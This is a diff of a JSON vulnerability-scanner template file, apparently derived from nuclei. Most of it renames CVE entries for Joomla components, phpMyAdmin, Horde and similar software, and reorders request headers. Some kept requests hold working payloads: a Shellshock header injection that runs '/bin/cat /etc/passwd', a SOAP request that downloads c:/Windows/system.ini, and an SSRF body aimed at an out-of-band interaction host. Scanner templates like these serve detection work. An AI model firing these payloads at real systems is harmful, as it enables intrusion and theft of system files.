@@ -161,7 +161,7 @@
     {
       "id": "CVE-2007-4504",
       "info": {
-        "name": "Joomla! Component RSfiles <=1.0.2 - Arbitrary File Retrieval",
+        "name": "Joomla! RSfiles <=1.0.2 - Local File Inclusion",
         "severity": "high"
       },
       "requests": [
@@ -254,7 +254,7 @@
     {
       "id": "CVE-2008-4764",
       "info": {
-        "name": "Joomla! Component com_extplorer 2.0.0 RC2 - Directory Traversal",
+        "name": "Joomla! <=2.0.0 RC2 - Local File Inclusion",
         "severity": "high"
       },
       "requests": [
@@ -284,7 +284,7 @@
     {
       "id": "CVE-2008-6080",
       "info": {
-        "name": "Joomla! Component ionFiles 4.4.2 - File Disclosure",
+        "name": "Joomla! ionFiles 4.4.2 - Local File Inclusion",
         "severity": "high"
       },
       "requests": [
@@ -314,7 +314,7 @@
     {
       "id": "CVE-2008-6222",
       "info": {
-        "name": "Joomla! Component ProDesk 1.0/1.2 - Local File Inclusion",
+        "name": "Joomla! ProDesk 1.0/1.2 - Local File Inclusion",
         "severity": "high"
       },
       "requests": [
@@ -329,7 +329,7 @@
     {
       "id": "CVE-2008-6668",
       "info": {
-        "name": "nweb2fax <=0.2.7- Local File Inclusion",
+        "name": "nweb2fax <=0.2.7 - Local File Inclusion",
         "severity": "high"
       },
       "requests": [
@@ -360,7 +360,7 @@
     {
       "id": "CVE-2009-0932",
       "info": {
-        "name": "Horde - Horde_Image::factory driver Argument LFI",
+        "name": "Horde/Horde Groupware - Local File Inclusion",
         "severity": "high"
       },
       "requests": [
@@ -375,8 +375,8 @@
     {
       "id": "CVE-2009-1151",
       "info": {
-        "name": "PhpMyAdmin Scripts/setup.php Deserialization Vulnerability",
-        "severity": "high"
+        "name": "PhpMyAdmin Scripts - Remote Code Execution",
+        "severity": "critical"
       },
       "requests": [
         {
@@ -389,7 +389,7 @@
     {
       "id": "CVE-2009-1496",
       "info": {
-        "name": "Joomla! Component Cmimarketplace - 'viewit' Directory Traversal",
+        "name": "Joomla! Cmimarketplace 0.1 - Local File Inclusion",
         "severity": "high"
       },
       "requests": [
@@ -404,7 +404,7 @@
     {
       "id": "CVE-2009-1558",
       "info": {
-        "name": "Linksys WVC54GCA 1.00R22/1.00R24 (Wireless-G) - Directory Traversal",
+        "name": "Cisco Linksys WVC54GCA 1.00R22/1.00R24 - Local File Inclusion",
         "severity": "high"
       },
       "requests": [
@@ -434,7 +434,7 @@
     {
       "id": "CVE-2009-2015",
       "info": {
-        "name": "Joomla! Component MooFAQ (com_moofaq) - Local File Inclusion",
+        "name": "Joomla! MooFAQ 1.0 - Local File Inclusion",
         "severity": "high"
       },
       "requests": [
@@ -449,7 +449,7 @@
     {
       "id": "CVE-2009-2100",
       "info": {
-        "name": "Joomla! Component com_Projectfork 2.0.10 - Local File Inclusion",
+        "name": "Joomla! JoomlaPraise Projectfork  2.0.10 - Local File Inclusion",
         "severity": "high"
       },
       "requests": [
@@ -464,7 +464,7 @@
     {
       "id": "CVE-2009-3053",
       "info": {
-        "name": "Joomla! Component Agora 3.0.0b (com_agora) - Local File Inclusion",
+        "name": "Joomla! Agora 3.0.0b  - Local File Inclusion",
         "severity": "high"
       },
       "requests": [
@@ -3325,9 +3325,9 @@
       "requests": [
         {
           "headers": {
-            "Cookie": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
             "Shellshock": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
-            "Referer": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
+            "Referer": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
+            "Cookie": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
           },
           "method": "GET",
           "path": [
@@ -6260,7 +6260,7 @@
     {
       "id": "CVE-2018-12613",
       "info": {
-        "name": "PhpMyAdmin 4.8.1 Remote File Inclusion",
+        "name": "PhpMyAdmin <4.8.2 - Local File Inclusion",
         "severity": "high"
       },
       "requests": [
@@ -6350,7 +6350,7 @@
     {
       "id": "CVE-2018-1335",
       "info": {
-        "name": "Apache Tika 1.15-1.17 Header Command Injection",
+        "name": "Apache Tika <1.1.8-  Header Command Injection",
         "severity": "high"
       },
       "requests": [
@@ -6526,7 +6526,7 @@
     {
       "id": "CVE-2018-14918",
       "info": {
-        "name": "LOYTEC LGATE-902 6.3.2 - Directory Traversal",
+        "name": "LOYTEC LGATE-902 6.3.2 - Local File Inclusion",
         "severity": "high"
       },
       "requests": [
@@ -6556,7 +6556,7 @@
     {
       "id": "CVE-2018-15138",
       "info": {
-        "name": "LG-Ericsson iPECS NMS 30M Directory Traversal",
+        "name": "LG-Ericsson iPECS NMS 30M - Local File Inclusion",
         "severity": "high"
       },
       "requests": [
@@ -6587,7 +6587,7 @@
     {
       "id": "CVE-2018-15535",
       "info": {
-        "name": "Responsive FileManager < 9.13.4 - Directory Traversal",
+        "name": "Responsive FileManager <9.13.4 - Local File Inclusion",
         "severity": "high"
       },
       "requests": [
@@ -9535,8 +9535,8 @@
         {
           "body": "url=https://{{Host}}:443@{{interactsh-url}}\n",
           "headers": {
-            "Content-Type": "application/x-www-form-urlencoded",
-            "X-Atlassian-Token": "no-check"
+            "X-Atlassian-Token": "no-check",
+            "Content-Type": "application/x-www-form-urlencoded"
           },
           "method": "POST",
           "path": [
@@ -9641,7 +9641,7 @@
     {
       "id": "CVE-2019-9726",
       "info": {
-        "name": "Homematic CCU3 - Directory Traversal / Arbitrary File Read",
+        "name": "Homematic CCU3 - Local File Inclusion",
         "severity": "high"
       },
       "requests": [
@@ -9700,7 +9700,7 @@
     {
       "id": "CVE-2020-0618",
       "info": {
-        "name": "RCE in SQL Server Reporting Services",
+        "name": "Microsoft SQL Server Reporting Services - Remote Code Execution",
         "severity": "high"
       },
       "requests": [
@@ -11292,9 +11292,9 @@
         {
           "body": "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:tem=\"http://tempuri.org/\">\n   <soapenv:Header/>\n   <soapenv:Body>\n      <tem:downLoadFile>\n         <tem:path>c:/Windows/system.ini</tem:path>\n      </tem:downLoadFile>\n   </soapenv:Body>\n</soapenv:Envelope>\n",
           "headers": {
+            "soapaction": "http://tempuri.org/ICVSearchSvc/downLoadFile",
             "content-type": "text/xml",
-            "Cookie": "Login",
-            "soapaction": "http://tempuri.org/ICVSearchSvc/downLoadFile"
+            "Cookie": "Login"
           },
           "method": "POST",
           "path": [
@@ -12558,7 +12558,7 @@
     {
       "id": "CVE-2020-8644",
       "info": {
-        "name": "playSMS - Pre-Authentication Remote Code Execution (CVE-2020-8644)",
+        "name": "playSMS<1.4.3 - Remote Code Execution",
         "severity": "critical"
       },
       "requests": [
